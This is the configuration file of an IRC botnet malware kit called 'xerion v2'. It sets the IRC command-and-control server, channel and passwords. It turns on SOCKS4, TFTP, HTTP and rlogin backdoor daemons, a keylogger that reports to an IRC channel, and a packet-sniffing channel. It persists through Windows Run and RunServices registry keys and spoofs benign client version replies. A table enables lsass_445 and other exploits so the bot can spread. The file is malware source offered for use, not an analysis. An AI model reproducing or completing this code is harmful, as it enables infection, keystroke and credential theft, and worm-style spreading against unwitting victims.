/*

PRIV8


- xerion | v2 -
check docs for commands

*/

// ______________________________________________________________
// ** standard configuration:**
// ______________________________________________________________

int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 12525;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 1576;			// Port # for tftp daemon to run on
int httpport = 8180;			// Port # for http daemon to run on
int rloginport = 519;			// Port # for rlogin daemon to run on
int maxrand = 5;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)


BOOL nickprefix = FALSE;		// nick uptime & mirc prefix
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys

// ______________________________________________________________

char prefix = '-';				  // command prefix (one character max.)
const char mutex[] = "volvo"; // mutex, change this to whatever
char lsaip[] = "";                // ** DONT CHANGE THIS LINE **
char lsaport[] = "2227";		  // change this to whatever port you want.
char lsuser[] = "schi";			  // change this to whatever user you want.
char lspass[] = "infi";		      // change this to whatever pass you want.
char botid[] = "botid";			  // bot id
char password[] = "password";	 // bot password
char server[] = "ircd-server1.net";	// server
char serverpass[] = "";						// server password
char channel[] = "#channel";				// channel that the bot should join
char chanpass[] = "channelkey";				// channel password
char server2[] = "ircd-server2.net";		// backup server (optional)
char channel2[] = "#channel";				// backup channel (optional)
char chanpass2[] = "channelkey";			// backup channel password (optional)
char filename[] = "botfile.exe";			// destination file name
char keylogfile[] = "bkfdb.db";				// keylog filename
char valuename[] = "Windows Registry Name";	// value name for autostart
char nickconst[] = "XER-";					// first part to the bot's nick
char szLocalPayloadFile[]="botfile.dat";	// Payload filename
char modeonconn[] = "+xi";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#exploit-channel";	// Channel where exploit messages get redirected
char psniffchan[] = "#sniff-channel";		// sniffing channel
char keylogchan[] = "#keylog-channel";		// Channel where keylog messages get redirected
char version[] = "- xerion v2 -";    		// !bot version reply
unsigned int daysup = 1;					// minimum number (of days) to show in uptime prefix
char *authost[] = {
	"*@*7.7.7.7",
};
char *versionlist[] = {
	"iroffer v1.3.b07 [20040406152029], http://iroffer.org/ - CYGWIN_NT-5.0 1.5.6(0.108/3/2)",
	"iroffer v1.2.b02 [20040406152029], http://iroffer.org/ - CYGWIN_NT-5.0 1.5.6(0.108/3/2)"
};
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

/*
Not sure how effective this is, or if it even works... taken out for now.
// ______________________________________________________________

// ** IRCD-less, automatic scanning configuration: **
// ______________________________________________________________

#define AUIP "" // ip range to scan (ex: 211.x.x.x), leave it blank for a local scan.
#define sploit "lsass_445" // exploit to use
int athread = 15; // number of threads to use
int delay = 6; // initial scan delay
int minutes = 20; // number of minutes to scan (0 is infinite)
BOOL arandom = TRUE; //

// ______________________________________________________________
*/

// ** !exploit.mls settings **
// ______________________________________________________________

SCANALL scanall[]={
{"lsass_445", true},
{"ls1ls", true},
{"ndcass", true}, // nice combo
{NULL, false}
};

//_______________________________________________________________

// ** worthless settings: **
// ______________________________________________________________
#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

// ______________________________________________________________
